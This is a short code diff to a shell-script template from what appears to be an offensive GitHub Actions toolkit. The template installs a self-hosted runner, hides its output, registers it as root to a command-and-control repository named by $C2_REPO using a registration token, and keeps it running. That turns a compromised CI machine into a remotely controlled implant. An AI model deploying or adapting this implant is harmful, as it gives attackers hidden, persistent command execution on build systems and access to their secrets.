@@ -50,10 +50,10 @@ KEEP_ALIVE={4}
 mkdir -p $HOME/.actions-runner1/ && cd $HOME/.actions-runner1/
 curl -o {2} -L https://github.com/actions/runner/releases/download/{3}/{2} > /dev/null 2>&1
 tar xzf ./{2}
+export RUNNER_ALLOW_RUNASROOT="1"
 ./config.sh --url https://github.com/$C2_REPO --unattended --token $REG_TOKEN --name "gatox-{5}" --labels "gatox-{5}" > /dev/null 2>&1
 rm {2}
 
-export RUNNER_ALLOW_RUNASROOT="1"
 if [ "$KEEP_ALIVE" = true ]; then
     export RUNNER_TRACKING_ID=0 && ./run.sh > /dev/null 2>&1
 else
